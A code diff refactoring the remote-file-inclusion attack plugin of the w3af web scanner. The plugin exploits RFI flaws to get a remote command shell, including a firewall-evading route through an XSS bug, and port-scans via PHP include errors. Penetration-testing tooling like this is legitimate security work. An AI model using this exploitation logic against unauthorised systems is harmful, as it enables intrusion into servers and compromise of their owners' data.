@@ -19,33 +19,25 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
+import os
 
-
-# Common includes
-from core.data.fuzzer.fuzzer import createRandAlNum
 import core.controllers.outputManager as om
-
-# options
-from core.data.options.option import option
-from core.data.options.optionList import optionList
-
-from core.controllers.plugins.attack_plugin import AttackPlugin
 import core.data.kb.knowledgeBase as kb
 import core.controllers.daemons.webserver as webserver
+import plugins.attack.payloads.shell_handler as shell_handler
+import core.data.constants.w3afPorts as w3afPorts
+
+from core.data.fuzzer.fuzzer import createRandAlNum
+from core.data.options.option import option
+from core.data.options.optionList import optionList
+from core.controllers.plugins.attack_plugin import AttackPlugin
 from core.controllers.w3afException import w3afException
 from core.controllers.misc.homeDir import get_home_dir
 from core.controllers.misc.get_local_ip import get_local_ip
-
-# Advanced shell stuff
 from core.data.kb.exec_shell import exec_shell as exec_shell
 from core.data.kb.shell import shell as shell
-import plugins.attack.payloads.shell_handler as shell_handler
 from plugins.attack.payloads.decorators.exec_decorator import exec_debug
 
-# Port definition
-import core.data.constants.w3afPorts as w3afPorts
-
-import os
 
 NO_SUCCESS = 0
 SUCCESS_COMPLETE = 1
@@ -67,10 +59,10 @@ class rfi(AttackPlugin):
         self._exploit_dc = None
         
         # User configured variables
-        self._listen_port = w3afPorts.REMOTEFILEINCLUDE_SHELL
+        self._listen_port = w3afPorts.RFI_SHELL
         self._listen_address = get_local_ip()
         self._use_XSS_vuln = True
-        self._generateOnlyOne = True
+        self._generate_only_one = True
 
     def fastExploit(self, url, method, data):
         '''
@@ -85,8 +77,9 @@ class rfi(AttackPlugin):
         
     def canExploit(self, vuln_to_exploit=None):
         '''
-        Searches the kb for vulnerabilities that this plugin can exploit, this is overloaded from AttackPlugin because
-        I need to test for xss vulns also. This is a "complex" plugin.
+        Searches the kb for vulnerabilities that this plugin can exploit, this
+        is overloaded from AttackPlugin because I need to test for xss vulns
+        also. This is a "complex" plugin.
 
         @parameter vuln_to_exploit: The id of the vulnerability to exploit.
         @return: True if plugin knows how to exploit a found vuln.
@@ -164,43 +157,43 @@ class rfi(AttackPlugin):
     
     def getVulnName2Exploit( self ):
         '''
-        This method should return the vulnerability name (as saved in the kb) to exploit.
-        For example, if the audit.os_commanding plugin finds an vuln, and saves it as:
+        This method should return the vulnerability name (as saved in the kb)
+        to exploit. For example, if the audit.os_commanding plugin finds an vuln,
+        and saves it as:
         
         kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
         
-        Then the exploit plugin that exploits os_commanding ( attack.os_commanding ) should
-        return 'os_commanding' in this method.
+        Then the exploit plugin that exploits os_commanding ( attack.os_commanding )
+        should return 'os_commanding' in this method.
         '''
         return 'rfi'
         
-    def _generateShell( self, vuln_obj ):
+    def _generate_shell( self, vuln_obj ):
         '''
         @parameter vuln_obj: The vuln to exploit.
         @return: A shell object based on the vuln that is passed as parameter.
         '''
         # Check if we really can execute commands on the remote server
-        exploit_success = self._verifyVuln( vuln_obj )
+        exploit_success = self._verify_vuln( vuln_obj )
         if exploit_success == SUCCESS_COMPLETE:
 
             # Create the shell object
-            shell_obj = rfi_shell( vuln_obj )
+            shell_obj = RFIShell( vuln_obj )
             shell_obj.set_url_opener( self._uri_opener )
-            shell_obj.set_cut( self._header_length, self._footer_length )
             shell_obj.setExploitDc( self._exploit_dc )
             return shell_obj
         
         elif exploit_success == SUCCESS_OPEN_PORT:
 
             # Create the portscan shell object
-            shell_obj = portscan_shell( vuln_obj )
+            shell_obj = PortScanShell( vuln_obj )
             shell_obj.set_url_opener( self._uri_opener )
             return shell_obj
 
         else:
             return None
 
-    def _verifyVuln(self, vuln):
+    def _verify_vuln(self, vuln):
         '''
         This command verifies a vuln. This is really hard work!
 
@@ -235,19 +228,14 @@ class rfi(AttackPlugin):
             try:
                 http_res = function_reference(vuln.getURL(), str(data_container))
             except:
-                successfully_exploited = False
+                continue
             else:
-                successfully_exploited = self._define_exact_cut(
-                                                http_res.getBody(),
-                                                shell_handler.SHELL_IDENTIFIER)
-
-
-            if successfully_exploited:
-                self._exploit_dc = data_container
-                return SUCCESS_COMPLETE
-            else:
-                # Remove the file from the local webserver webroot
-                self._rm_file(url_to_include)
+                if shell_handler.SHELL_IDENTIFIER in http_res.body:
+                    self._exploit_dc = data_container
+                    return SUCCESS_COMPLETE
+                else:
+                    # Remove the file from the local webserver webroot
+                    self._rm_file(url_to_include)
         
         else:
             
@@ -267,7 +255,7 @@ class rfi(AttackPlugin):
                 return False
             else:
                 rfi_errors = ['php_network_getaddresses: getaddrinfo',
-                                    'failed to open stream: Connection refused in']
+                              'failed to open stream: Connection refused in']
                 for error in rfi_errors:
                     if error in http_response.getBody():
                         return SUCCESS_OPEN_PORT
@@ -277,7 +265,7 @@ class rfi(AttackPlugin):
     def _gen_url_to_include( self, file_content, extension ):
         '''
         Generate the URL to include, based on the configuration it will return a 
-        URL poiting to a XSS bug, or a URL poiting to our local webserver.
+        URL pointing to a XSS bug, or our local webserver.
         '''
         if self._use_XSS_vuln and self._xss_vuln:
             url = self._xss_vuln.getURL().uri2url()
@@ -333,7 +321,7 @@ class rfi(AttackPlugin):
         o3 = option('useXssBug', self._use_XSS_vuln, d3, 'boolean')
         
         d4 = 'If true, this plugin will try to generate only one shell object.'
-        o4 = option('generateOnlyOne', self._generateOnlyOne, d4, 'boolean')
+        o4 = option('generateOnlyOne', self._generate_only_one, d4, 'boolean')
         
         ol = optionList()
         ol.add(o1)
@@ -353,19 +341,13 @@ class rfi(AttackPlugin):
         self._listen_address = optionsMap['listenAddress'].getValue()
         self._listen_port = optionsMap['listenPort'].getValue()
         self._use_XSS_vuln = optionsMap['useXssBug'].getValue()
-        self._generateOnlyOne = optionsMap['generateOnlyOne'].getValue()
+        self._generate_only_one = optionsMap['generateOnlyOne'].getValue()
         
         if self._listen_address == '' and not self._use_XSS_vuln:
             om.out.error('rfi plugin has to be correctly configured to use.')
             return False
             
     def getRootProbability( self ):
-        '''
-        @return: This method returns the probability of getting a root shell using this attack plugin.
-        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
-        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
-        return a root shell.
-        '''
         return 0.8
     
     def getLongDesc( self ):
@@ -373,12 +355,13 @@ class rfi(AttackPlugin):
         @return: A DETAILED description of the plugin functions and features.
         '''
         return '''
-        This plugin exploits remote file inclusion vulnerabilities and returns a remote shell. The 
-        exploitation can be done using a more classic approach, in which the file to be included 
-        is hosted on a webserver that the plugin runs, or a nicer approach, in which a XSS bug on 
-        the remote site is used to generate the remote file to be included. Both ways work and 
-        return a shell, but the one that uses XSS will work even when a restrictive firewall is 
-        configured at the remote site.
+        This plugin exploits remote file inclusion vulnerabilities and returns a
+        remote shell. The exploitation can be done using a more classic approach,
+        in which the file to be included is hosted on a webserver that the plugin
+        runs, or a nicer approach, in which a XSS bug on the remote site is used
+        to generate the remote file to be included. Both ways work and return a
+        shell, but the one that uses XSS will work even when a restrictive firewall
+        is configured at the remote site.
         
         Four configurable parameters exist:
             - listenAddress
@@ -388,9 +371,9 @@ class rfi(AttackPlugin):
         '''
 
 
-class portscan_shell(shell):
+class PortScanShell(shell):
     '''
-    I create this shell when for some reason I was unable to create the rfi_shell,
+    I create this shell when for some reason I was unable to create the RFIShell,
     AND the "include()" method is showing errors, allowing me to determine if a
     port is open or not. 
     '''
@@ -427,8 +410,9 @@ class portscan_shell(shell):
 
     def getName(self):
         return 'portscan-shell object'
-        
-class rfi_shell(exec_shell):
+
+
+class RFIShell(exec_shell):
     '''
     I create this shell when the remote host allows outgoing connections, or when
     the attack plugin was configured to use XSS vulnerabilities to exploit the RFI and
@@ -443,7 +427,8 @@ class rfi_shell(exec_shell):
     
     def setExploitDc(self, e_dc):
         '''
-        Save the exploit data container, that holds all the parameters for a successful exploitation
+        Save the exploit data container, that holds all the parameters for a
+        successful exploitation
         
         @parameter e_dc: The exploit data container.
         '''
@@ -478,7 +463,20 @@ class rfi_shell(exec_shell):
         except Exception, e:
             return 'Unhandled exception from the remote web application:' + str(e)
         else:
-            return self._cut( http_res.getBody())
+            return self._extract_result( http_res.getBody())
+    
+    def _extract_result(self, body):
+        if shell_handler.SHELL_IDENTIFIER_1 not in body or \
+        shell_handler.SHELL_IDENTIFIER_2 not in body:
+            msg = 'Unable to execute remote command, result extraction'
+            msg += ' failed.'
+            raise w3afException( msg)
+
+        idx_1 = body.index(shell_handler.SHELL_IDENTIFIER_1)
+        len_1 = len(shell_handler.SHELL_IDENTIFIER_1)
+        idx_2 = body.index(shell_handler.SHELL_IDENTIFIER_2)
+        return body[idx_1+len_1:idx_2]
+        
         
     def end(self):
         '''
@@ -488,12 +486,13 @@ class rfi_shell(exec_shell):
         try:
             self._rm_file(self.getExploitDc()[self.getVar()])
         except Exception, e:
-            om.out.error('Remote file inclusion shell cleanup failed with exception: ' + str(e))
+            msg = 'Remote file inclusion shell cleanup failed with exception: %s'
+            om.out.error(msg % e)
         else:
             om.out.debug('Remote file inclusion shell cleanup complete.')
     
     def getName(self):
-        return 'rfi_shell'
+        return 'RFIShell'
 
     def _rm_file(self, url_to_include):
         '''
